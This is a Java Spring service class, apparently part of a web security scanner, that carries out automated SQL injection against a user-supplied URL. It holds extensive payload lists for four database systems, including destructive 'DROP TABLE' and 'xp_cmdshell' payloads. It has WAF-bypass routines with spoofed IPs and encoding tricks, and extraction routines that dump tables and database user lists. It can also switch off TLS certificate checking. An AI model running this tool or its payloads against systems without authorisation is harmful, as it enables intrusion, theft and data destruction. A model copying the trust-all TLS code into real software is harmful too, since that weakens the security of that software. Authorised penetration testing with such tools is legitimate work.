package com.web.webservices;

import org.apache.hc.client5.http.classic.HttpClient;
import org.apache.http.conn.ssl.NoopHostnameVerifier;
import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
import org.apache.http.conn.ssl.TrustStrategy;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.springframework.http.*;
import org.springframework.http.client.HttpComponentsClientHttpRequestFactory;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;
import org.springframework.web.util.UriComponentsBuilder;

import com.web.webDTO.*;

import javax.net.ssl.SSLContext;
import java.net.URI;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.security.KeyManagementException;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.X509Certificate;
import java.util.*;
import java.util.concurrent.*;
import java.util.regex.*;

@Service
public class SQLInjectionWithGetService {


    private static final Map<String, List<String>> DBMS_PAYLOADS = Map.of(
        "MySQL", Arrays.asList(
            // Original
            "' OR 1=1#",
            "' UNION SELECT 1,@@version,3,4#",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' AND 1=CONVERT(int,@@version)--",

            // Extended
            "' OR 1=1--", "' OR 1=1-- -", "' OR 1=1#",
            "' OR '1'='1'--", "' OR '1'='1'-- -", "' OR '1'='1'#",
            "\" OR 1=1--", "\" OR 1=1-- -", "\" OR 1=1#",
            "') OR 1=1--", "') OR 1=1-- -", "') OR 1=1#",
            "'; OR 1=1--", "'; OR 1=1-- -", "'; OR 1=1#",
            "'/**/OR/**/1=1--", "'/**/OR/**/1=1/*", "' OR/**/1=1/*",
            "'/*!OR*/ 1=1--", "' /*!50000OR*/ 1=1--", "' OR 1=1/*",
            "'+ ''/*", "'--+", "'-- ", "'# ", "'#--",
            "' OR version()--", "' OR sin(1)--", "' OR LENGTH('abc')=3--",
            "' OR NOW()=NOW()--", "' OR RAND()<1--", "' OR 2>1--",
            "' OR 1#", "' OR TRUE#", "' OR 'a' IN ('a')#", "' OR 'abc' LIKE 'a%'#",
            "'%20OR%201=1--", "'%0AOR%0A1=1--", "'%09OR%091=1--",
            "'%0BOR%0B1=1--", "'%0COR%0C1=1--", "'%0DOR%0D1=1--",
            "'%EF%BC%87%20%4F%52%20%31%3D%31%2D%2D",
            "'%2527%2520%254F%2552%2520%2531%253D%2531%252D%252D",
            "' OR SLEEP(5)--", "' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "\" OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "') OR (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "');WAITFOR DELAY '0:0:5'--",
            "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')--",
            "' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')=1--",
            "' OR 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
            "' AND 1=1--sp_password", "' EXEC sp_executesql N'SELECT 1'--",
            "'%20%68%61%76%69%6E%67%20%31%3D%31%2D%2D",
            "' || '1'='1", "'+(SELECT '1')+'", "' || (SELECT '1') || '",
            "\\\" OR 1=1--", "\\\" || '1'='1", "\\\"}'); WAITFOR DELAY '0:0:5'--"
        ),

        "PostgreSQL", Arrays.asList(
            // Original
            "' OR 1=1--",
            "' UNION SELECT 1,version(),3,4--",
            "' AND (SELECT pg_sleep(5))--",
            "' AND 1=CAST(version() AS int)--",

            // Extended
            "' OR TRUE--", "' OR 'a'='a'--", "' OR 1=1/*",
            "';SELECT pg_sleep(5);--",
            "';SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
            "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
            "' || (SELECT version())--",
            "' UNION SELECT table_name, NULL, NULL FROM information_schema.tables--",
            "'; DROP TABLE users;--",
            "')) OR (SELECT pg_sleep(5)) IS NOT NULL--",
            "';COPY (SELECT version()) TO '/tmp/version.txt';--",
            "' OR EXISTS(SELECT 1 FROM pg_tables WHERE schemaname='public')--",
            "' AND ascii(substr(version(),1,1))=49--",
            "' AND EXISTS(SELECT 1 FROM pg_user)--",
            "'; DO $$ BEGIN PERFORM pg_sleep(5); END $$--"
        ),

        "Oracle", Arrays.asList(
            // Original
            "' OR 1=1--",
            "' UNION SELECT 1,banner,3,4 FROM v$version--",
            "' AND (SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual) IS NOT NULL--",
            "' AND 1=TO_NUMBER(DBMS_UTILITY.GET_PARAMETER_VALUE('compatible'))--",

            // Extended
            "' OR '1'='1'--", "' OR 1=1/*",
            "' OR EXISTS (SELECT * FROM dual WHERE 'a'='a')--",
            "' UNION SELECT NULL,NULL,NULL FROM DUAL--",
            "' UNION SELECT table_name FROM all_tables WHERE ROWNUM = 1--",
            "' AND 1=(SELECT COUNT(*) FROM all_users)--",
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            "' AND 1=(SELECT 1 FROM DUAL WHERE ROWNUM=1)--",
            "' AND LENGTH('abc')=3--",
            "' OR UTL_INADDR.get_host_name('localhost') IS NOT NULL--",
            "' OR 1=UTL_HTTP.REQUEST('http://localhost')--",
            "' OR ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))=49--"
        ),

        "MSSQL", Arrays.asList(
            // Original
            "' OR 1=1--",
            "' UNION SELECT 1,@@version,3,4--",
            "' WAITFOR DELAY '0:0:5'--",
            "' AND 1=CONVERT(int,@@version)--",

            // Extended
            "' OR '1'='1'--", "' OR 1=1/*",
            "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
            "' AND EXISTS(SELECT * FROM sysobjects WHERE xtype='U')--",
            "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--",
            "'; EXEC master.dbo.xp_dirtree 'C:\\'--",
            "' AND 1=(SELECT COUNT(*) FROM sys.databases)--",
            "' AND ASCII(SUBSTRING(@@version,1,1))=77--",
            "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
            "' AND (SELECT TOP 1 name FROM master.dbo.sysdatabases) IS NOT NULL--",
            "' OR ISNULL(1,0)=1--",
            "'; EXEC sp_executesql N'SELECT @@version'--"
        )
    );

    private static final List<String> WAF_BYPASS_TECHNIQUES = Arrays.asList(
        "IP Rotation",
        "HTTP Parameter Pollution",
        "Case Variation",
        "Null Byte Injection",
        "Unicode Encoding",
        "Double URL Encoding",
        "Comment Injection",
        "HTTP Method Override"
    );

    private RestTemplate restTemplate;
    private boolean sslVerificationDisabled = false;
    private ExecutorService executorService;

    public SQLInjectionWithGetService() {
        this.restTemplate = new RestTemplate();
        this.executorService = Executors.newCachedThreadPool();
    }

    public SQLInjectionTestResult performAdvancedTest(SQLInjectionTestRequest request) {
        SQLInjectionTestResult result = new SQLInjectionTestResult();
        result.setStartTime(new Date());
        
        try {
            if (request.isDisableSSLVerification()) {
                disableSSLVerification();
                sslVerificationDisabled = true;
            }

            // Fingerprint DBMS
            String dbms = fingerprintDBMS(request.getUrl(), request.getParameters());
            result.setDbms(dbms != null ? dbms : "Unknown");
            
            // Test for vulnerabilities
            boolean isVulnerable = false;
            
            // Test error-based SQLi
            if (request.isTestErrorBased()) {
                isVulnerable |= testErrorBasedInjection(request, result);
            }
            
            // Test boolean-based blind SQLi
            if (request.isTestBooleanBased() && !isVulnerable) {
                isVulnerable |= testBooleanBasedInjection(request, result);
            }
            
            // Test time-based blind SQLi
            if (request.isTestTimeBased() && !isVulnerable) {
                isVulnerable |= testTimeBasedInjection(request, result);
            }
            
            // Test UNION-based SQLi
            if (request.isTestUnionBased() && !isVulnerable) {
                isVulnerable |= testUnionBasedInjection(request, result);
            }
            
            // Test stacked queries
            if (request.isTestStackedQueries() && !isVulnerable) {
                isVulnerable |= testStackedQueries(request, result);
            }
            
            // Attempt WAF bypass if needed
            if (request.isAttemptWafBypass() && !isVulnerable) {
                isVulnerable |= attemptWafBypass(request, result);
            }
            
            // Data extraction if vulnerable
            if (isVulnerable && request.isAttemptDataExtraction()) {
                result.setExtractedData(extractData(request, dbms));
            }
            
            result.setVulnerable(isVulnerable);
            result.setEndTime(new Date());
            
        } catch (Exception e) {
            result.setErrorMessage("Error during scanning: " + e.getMessage());
        } finally {
            if (sslVerificationDisabled) {
                enableSSLVerification();
                sslVerificationDisabled = false;
            }
        }
        
        return result;
    }

    private String fingerprintDBMS(String url, Map<String, String> parameters) {
        Map<String, String> dbmsFingerprints = Map.of(
            "MySQL", "You have an error in your SQL syntax",
            "PostgreSQL", "PostgreSQL query failed",
            "Oracle", "ORA-[0-9]{5}",
            "MSSQL", "Microsoft SQL Server"
        );
        
        for (Map.Entry<String, List<String>> entry : DBMS_PAYLOADS.entrySet()) {
            for (String payload : entry.getValue()) {
                String testUrl = buildTestUrl(url, parameters, payload);
                String response = sendHttpRequest(testUrl, "GET", null);
                
                for (Map.Entry<String, String> fp : dbmsFingerprints.entrySet()) {
                    if (response != null && Pattern.compile(fp.getValue()).matcher(response).find()) {
                        return fp.getKey();
                    }
                }
            }
        }
        
        return null;
    }

    private boolean testErrorBasedInjection(SQLInjectionTestRequest request, SQLInjectionTestResult result) {
        List<String> successfulPayloads = new ArrayList<>();
        
        DBMS_PAYLOADS.getOrDefault(result.getDbms() != null ? result.getDbms() : "MySQL", DBMS_PAYLOADS.get("MySQL"))
            .stream()
            .filter(p -> p.contains("UNION") || p.contains("CONVERT") || p.contains("CAST"))
            .forEach(payload -> {
                String testUrl = buildTestUrl(request.getUrl(), request.getParameters(), payload);
                String response = sendHttpRequest(testUrl, request.getHttpMethod(), request.getCustomHeaders());
                
                if (isErrorBasedVulnerable(response)) {
                    successfulPayloads.add(payload);
                    result.getTechniquesDetected().add("Error-based");
                }
            });
        
        if (!successfulPayloads.isEmpty()) {
            result.getSuccessfulPayloads().addAll(successfulPayloads);
            return true;
        }
        return false;
    }

    private boolean testBooleanBasedInjection(SQLInjectionTestRequest request, SQLInjectionTestResult result) {
        String trueCondition = "1=1";
        String falseCondition = "1=0";
        
        String trueUrl = buildTestUrl(request.getUrl(), request.getParameters(), "' AND " + trueCondition + "--");
        String falseUrl = buildTestUrl(request.getUrl(), request.getParameters(), "' AND " + falseCondition + "--");
        String originalUrl = buildTestUrl(request.getUrl(), request.getParameters(), "");
        
        String trueResponse = sendHttpRequest(trueUrl, request.getHttpMethod(), request.getCustomHeaders());
        String falseResponse = sendHttpRequest(falseUrl, request.getHttpMethod(), request.getCustomHeaders());
        String originalResponse = sendHttpRequest(originalUrl, request.getHttpMethod(), request.getCustomHeaders());
        
        if (trueResponse != null && falseResponse != null && 
            !trueResponse.equals(falseResponse) && 
            (trueResponse.equals(originalResponse) || isBooleanBasedVulnerable(trueResponse, falseResponse))) {
            
            result.getTechniquesDetected().add("Boolean-based blind");
            result.getSuccessfulPayloads().add(trueCondition);
            return true;
        }
        
        return false;
    }

    private boolean testTimeBasedInjection(SQLInjectionTestRequest request, SQLInjectionTestResult result) {
        String timePayload = getTimeBasedPayload(result.getDbms());
        if (timePayload == null) return false;
        
        String testUrl = buildTestUrl(request.getUrl(), request.getParameters(), timePayload);
        
        long startTime = System.currentTimeMillis();
        sendHttpRequest(testUrl, request.getHttpMethod(), request.getCustomHeaders());
        long elapsed = System.currentTimeMillis() - startTime;
        
        if (elapsed >= 5000) { // 5 second delay threshold
            result.getTechniquesDetected().add("Time-based blind");
            result.getSuccessfulPayloads().add(timePayload);
            return true;
        }
        
        return false;
    }

    private String getTimeBasedPayload(String dbms) {
        if (dbms == null) return "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--";
        
        return switch (dbms) {
            case "MySQL" -> "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--";
            case "PostgreSQL" -> "' AND (SELECT pg_sleep(5))--";
            case "Oracle" -> "' AND (SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual) IS NOT NULL--";
            case "MSSQL" -> "' WAITFOR DELAY '0:0:5'--";
            default -> "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--";
        };
    }

    private boolean testUnionBasedInjection(SQLInjectionTestRequest request, SQLInjectionTestResult result) {
        int columns = detectColumnCount(request);
        if (columns == -1) return false;
        
        String unionPayload = buildUnionPayload(columns, result.getDbms());
        String testUrl = buildTestUrl(request.getUrl(), request.getParameters(), unionPayload);
        String response = sendHttpRequest(testUrl, request.getHttpMethod(), request.getCustomHeaders());
        
        if (isUnionBasedVulnerable(response)) {
            result.getTechniquesDetected().add("UNION-based");
            result.getSuccessfulPayloads().add(unionPayload);
            return true;
        }
        
        return false;
    }

    private int detectColumnCount(SQLInjectionTestRequest request) {
        for (int i = 1; i <= 20; i++) {
            String orderByUrl = buildTestUrl(request.getUrl(), request.getParameters(), "' ORDER BY " + i + "--");
            String response = sendHttpRequest(orderByUrl, request.getHttpMethod(), request.getCustomHeaders());
            
            if (response != null && response.contains("Unknown column")) {
                return i - 1;
            }
        }
        return -1;
    }

    private String buildUnionPayload(int columns, String dbms) {
        StringBuilder sb = new StringBuilder("' UNION SELECT ");
        for (int i = 1; i <= columns; i++) {
            sb.append(i);
            if (i < columns) sb.append(",");
        }
        
        if ("MySQL".equals(dbms)) sb.append(" FROM information_schema.tables#");
        else if ("PostgreSQL".equals(dbms)) sb.append(" FROM pg_catalog.pg_tables--");
        else if ("Oracle".equals(dbms)) sb.append(" FROM dual--");
        else if ("MSSQL".equals(dbms)) sb.append(" FROM sysobjects--");
        else sb.append("#");
        
        return sb.toString();
    }

    private boolean testStackedQueries(SQLInjectionTestRequest request, SQLInjectionTestResult result) {
        String stackedPayload = getStackedQueryPayload(result.getDbms());
        if (stackedPayload == null) return false;
        
        String testUrl = buildTestUrl(request.getUrl(), request.getParameters(), stackedPayload);
        String originalResponse = sendHttpRequest(buildTestUrl(request.getUrl(), request.getParameters(), ""), 
               request.getHttpMethod(), request.getCustomHeaders());
        String stackedResponse = sendHttpRequest(testUrl, request.getHttpMethod(), request.getCustomHeaders());
        
        if (stackedResponse != null && !stackedResponse.equals(originalResponse)) {
            result.getTechniquesDetected().add("Stacked queries");
            result.getSuccessfulPayloads().add(stackedPayload);
            return true;
        }
        
        return false;
    }

    private String getStackedQueryPayload(String dbms) {
        if (dbms == null) return null;
        
        return switch (dbms) {
            case "MySQL" -> "'; SELECT SLEEP(5)#";
            case "PostgreSQL" -> "'; SELECT pg_sleep(5)--";
            case "Oracle" -> "'; SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual--";
            case "MSSQL" -> "'; WAITFOR DELAY '0:0:5'--";
            default -> null;
        };
    }

    private boolean attemptWafBypass(SQLInjectionTestRequest request, SQLInjectionTestResult result) {
        for (String technique : WAF_BYPASS_TECHNIQUES) {
            boolean bypassed = false;
            
            switch (technique) {
                case "IP Rotation":
                    bypassed = testWithIpRotation(request, result);
                    break;
                case "HTTP Parameter Pollution":
                    bypassed = testWithParameterPollution(request, result);
                    break;
                case "Case Variation":
                    bypassed = testWithCaseVariation(request, result);
                    break;
                case "Null Byte Injection":
                    bypassed = testWithNullBytes(request, result);
                    break;
                case "Unicode Encoding":
                    bypassed = testWithUnicodeEncoding(request, result);
                    break;
                case "Double URL Encoding":
                    bypassed = testWithDoubleEncoding(request, result);
                    break;
                case "Comment Injection":
                    bypassed = testWithCommentInjection(request, result);
                    break;
                case "HTTP Method Override":
                    bypassed = testWithMethodOverride(request, result);
                    break;
            }
            
            if (bypassed) {
                result.getWafBypassTechniques().add(technique);
                return true;
            }
        }
        
        return false;
    }

    private Map<String, String> extractData(SQLInjectionTestRequest request, String dbms) {
        Map<String, String> data = new LinkedHashMap<>();
        
        if (dbms == null) dbms = "MySQL";
        
        // Get database version
        data.put("Database Version", extractWithPayload(request, 
            dbms.equals("MySQL") ? "' UNION SELECT 1,@@version,3,4#" :
            dbms.equals("PostgreSQL") ? "' UNION SELECT 1,version(),3,4--" :
            dbms.equals("Oracle") ? "' UNION SELECT 1,banner,3,4 FROM v$version--" :
            "' UNION SELECT 1,@@version,3,4--"
        ));
        
        // Get current database
        data.put("Current Database", extractWithPayload(request,
            dbms.equals("MySQL") ? "' UNION SELECT 1,database(),3,4#" :
            dbms.equals("PostgreSQL") ? "' UNION SELECT 1,current_database(),3,4--" :
            dbms.equals("Oracle") ? "' UNION SELECT 1,global_name,3,4 FROM global_name--" :
            "' UNION SELECT 1,DB_NAME(),3,4--"
        ));
        
        // Get tables
        data.put("Tables", extractWithPayload(request,
            dbms.equals("MySQL") ? "' UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()#" :
            dbms.equals("PostgreSQL") ? "' UNION SELECT 1,string_agg(table_name,','),3,4 FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')--" :
            dbms.equals("Oracle") ? "' UNION SELECT 1,LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),3,4 FROM all_tables--" :
            "' UNION SELECT 1,STRING_AGG(table_name,','),3,4 FROM information_schema.tables--"
        ));
        
        // Get users
        data.put("Users", extractWithPayload(request,
            dbms.equals("MySQL") ? "' UNION SELECT 1,GROUP_CONCAT(user),3,4 FROM mysql.user#" :
            dbms.equals("PostgreSQL") ? "' UNION SELECT 1,string_agg(usename,','),3,4 FROM pg_user--" :
            dbms.equals("Oracle") ? "' UNION SELECT 1,LISTAGG(username,',') WITHIN GROUP (ORDER BY username),3,4 FROM all_users--" :
            "' UNION SELECT 1,STRING_AGG(name,','),3,4 FROM sysusers--"
        ));
        
        return data;
    }

    private String extractWithPayload(SQLInjectionTestRequest request, String payload) {
        String testUrl = buildTestUrl(request.getUrl(), request.getParameters(), payload);
        String response = sendHttpRequest(testUrl, request.getHttpMethod(), request.getCustomHeaders());
        return extractBetween(response, "<td>", "</td>");
    }

    private String buildTestUrl(String url, Map<String, String> parameters, String payload) {
        UriComponentsBuilder builder = UriComponentsBuilder.fromHttpUrl(url);
        
        if (parameters != null) {
            for (Map.Entry<String, String> entry : parameters.entrySet()) {
                String value = entry.getValue();
                if (value != null && !value.isEmpty()) {
                    // Inject payload into the first parameter
                    if (payload != null && !payload.isEmpty() && entry.equals(parameters.entrySet().iterator().next())) {
                        value += payload;
                    }
                    builder.queryParam(entry.getKey(), URLEncoder.encode(value, StandardCharsets.UTF_8));
                }
            }
        }
        
        return builder.build().toUriString();
    }

    private String sendHttpRequest(String url, String method, Map<String, String> headersMap) {
        HttpHeaders headers = new HttpHeaders();
        if (headersMap != null) {
            headersMap.forEach(headers::add);
        }
        
        try {
            HttpMethod httpMethod = HttpMethod.valueOf(method != null ? method : "GET");
            HttpEntity<String> entity = new HttpEntity<>(headers);
            ResponseEntity<String> response = restTemplate.exchange(url, httpMethod, entity, String.class);
            return response.getBody();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }

    private void disableSSLVerification() throws NoSuchAlgorithmException, KeyManagementException, KeyStoreException {
        TrustStrategy acceptingTrustStrategy = (X509Certificate[] chain, String authType) -> true;
        SSLContext sslContext = org.apache.http.ssl.SSLContexts.custom()
                .loadTrustMaterial(null, acceptingTrustStrategy)
                .build();
        SSLConnectionSocketFactory csf = new SSLConnectionSocketFactory(sslContext, NoopHostnameVerifier.INSTANCE);
        CloseableHttpClient httpClient = HttpClients.custom()
                .setSSLSocketFactory(csf)
                .build();
        HttpComponentsClientHttpRequestFactory requestFactory = new HttpComponentsClientHttpRequestFactory();
        requestFactory.setHttpClient((HttpClient) httpClient);
        restTemplate.setRequestFactory(requestFactory);
    }

    private void enableSSLVerification() {
        restTemplate.setRequestFactory(new HttpComponentsClientHttpRequestFactory());
    }

    private String extractBetween(String text, String start, String end) {
        if (text == null || start == null || end == null) {
            return null;
        }
        
        int startIndex = text.indexOf(start);
        if (startIndex == -1) {
            return null;
        }
        
        startIndex += start.length();
        int endIndex = text.indexOf(end, startIndex);
        if (endIndex == -1) {
            return null;
        }
        
        return text.substring(startIndex, endIndex).trim();
    }

    private boolean isErrorBasedVulnerable(String response) {
        if (response == null) return false;
        String lowerResponse = response.toLowerCase();
        return lowerResponse.contains("sql") || lowerResponse.contains("syntax") || lowerResponse.contains("error")
            || lowerResponse.contains("warning") || lowerResponse.contains("exception");
    }

    private boolean isBooleanBasedVulnerable(String trueResponse, String falseResponse) {
        return trueResponse.length() != falseResponse.length() || 
            !trueResponse.contains("error") && falseResponse.contains("error");
    }

    private boolean isUnionBasedVulnerable(String response) {
        if (response == null) return false;
        return response.contains("admin") || response.contains("root") || response.contains("user")
            || response.contains("password") || response.contains("column") || response.contains("table")
            || response.contains("database") || response.contains("select") || response.contains("union");
    }

    private boolean testWithIpRotation(SQLInjectionTestRequest request, SQLInjectionTestResult result) {
        // Simulate IP rotation by adding X-Forwarded-For headers
        Map<String, String> headers = request.getCustomHeaders();
        if (headers == null) {
            headers = new HashMap<>();
        }
        
        // Generate random IPs
        String[] randomIps = {
            generateRandomIp(),
            generateRandomIp(),
            generateRandomIp()
        };
        
        for (String ip : randomIps) {
            headers.put("X-Forwarded-For", ip);
            String testUrl = buildTestUrl(request.getUrl(), request.getParameters(), "' OR 1=1--");
            String response = sendHttpRequest(testUrl, request.getHttpMethod(), headers);
            
            if (isErrorBasedVulnerable(response) || isUnionBasedVulnerable(response)) {
                result.getSuccessfulPayloads().add("X-Forwarded-For: " + ip);
                return true;
            }
        }
        
        return false;
    }

    private String generateRandomIp() {
        Random random = new Random();
        return random.nextInt(256) + "." + random.nextInt(256) + "." + 
               random.nextInt(256) + "." + random.nextInt(256);
    }

    private boolean testWithParameterPollution(SQLInjectionTestRequest request, SQLInjectionTestResult result) {
        if (request.getParameters() == null || request.getParameters().isEmpty()) {
            return false;
        }
        
        Map<String, String> pollutedParams = new HashMap<>(request.getParameters());
        String firstParamKey = pollutedParams.keySet().iterator().next();
        String originalValue = pollutedParams.get(firstParamKey);
        
        // Add duplicate parameter with payload
        pollutedParams.put(firstParamKey + "[]", originalValue + "' OR 1=1--");
        
        String testUrl = buildTestUrl(request.getUrl(), pollutedParams, null);
        String response = sendHttpRequest(testUrl, request.getHttpMethod(), request.getCustomHeaders());
        
        if (isErrorBasedVulnerable(response) || isUnionBasedVulnerable(response)) {
            result.getSuccessfulPayloads().add("Parameter pollution: " + firstParamKey + "[]");
            return true;
        }
        
        return false;
    }

    private boolean testWithCaseVariation(SQLInjectionTestRequest request, SQLInjectionTestResult result) {
        String payload = "' Or 1=1--";
        String testUrl = buildTestUrl(request.getUrl(), request.getParameters(), payload);
        String response = sendHttpRequest(testUrl, request.getHttpMethod(), request.getCustomHeaders());
        
        if (isErrorBasedVulnerable(response) || isUnionBasedVulnerable(response)) {
            result.getSuccessfulPayloads().add("Case variation: " + payload);
            return true;
        }
        
        return false;
    }

    private boolean testWithNullBytes(SQLInjectionTestRequest request, SQLInjectionTestResult result) {
        String payload = "%00' OR 1=1--";
        String testUrl = buildTestUrl(request.getUrl(), request.getParameters(), payload);
        String response = sendHttpRequest(testUrl, request.getHttpMethod(), request.getCustomHeaders());
        
        if (isErrorBasedVulnerable(response) || isUnionBasedVulnerable(response)) {
            result.getSuccessfulPayloads().add("Null byte: " + payload);
            return true;
        }
        
        return false;
    }

    private boolean testWithUnicodeEncoding(SQLInjectionTestRequest request, SQLInjectionTestResult result) {
        String payload = "%u0027%20OR%201=1--";
        String testUrl = buildTestUrl(request.getUrl(), request.getParameters(), payload);
        String response = sendHttpRequest(testUrl, request.getHttpMethod(), request.getCustomHeaders());
        
        if (isErrorBasedVulnerable(response) || isUnionBasedVulnerable(response)) {
            result.getSuccessfulPayloads().add("Unicode encoding: " + payload);
            return true;
        }
        
        return false;
    }

    private boolean testWithDoubleEncoding(SQLInjectionTestRequest request, SQLInjectionTestResult result) {
        String payload = "%2527%2520OR%25201%253D1--";
        String testUrl = buildTestUrl(request.getUrl(), request.getParameters(), payload);
        String response = sendHttpRequest(testUrl, request.getHttpMethod(), request.getCustomHeaders());
        
        if (isErrorBasedVulnerable(response) || isUnionBasedVulnerable(response)) {
            result.getSuccessfulPayloads().add("Double encoding: " + payload);
            return true;
        }
        
        return false;
    }

    private boolean testWithCommentInjection(SQLInjectionTestRequest request, SQLInjectionTestResult result) {
        String payload = "'/**/OR/**/1=1--";
        String testUrl = buildTestUrl(request.getUrl(), request.getParameters(), payload);
        String response = sendHttpRequest(testUrl, request.getHttpMethod(), request.getCustomHeaders());
        
        if (isErrorBasedVulnerable(response) || isUnionBasedVulnerable(response)) {
            result.getSuccessfulPayloads().add("Comment injection: " + payload);
            return true;
        }
        
        return false;
    }

    private boolean testWithMethodOverride(SQLInjectionTestRequest request, SQLInjectionTestResult result) {
        // Try with different HTTP methods
        String[] methods = {"POST", "PUT", "DELETE", "PATCH"};
        String payload = "' OR 1=1--";
        
        for (String method : methods) {
            String testUrl = buildTestUrl(request.getUrl(), request.getParameters(), payload);
            String response = sendHttpRequest(testUrl, method, request.getCustomHeaders());
            
            if (isErrorBasedVulnerable(response) || isUnionBasedVulnerable(response)) {
                result.getSuccessfulPayloads().add("Method override: " + method);
                return true;
            }
        }
        
        return false;
    }
}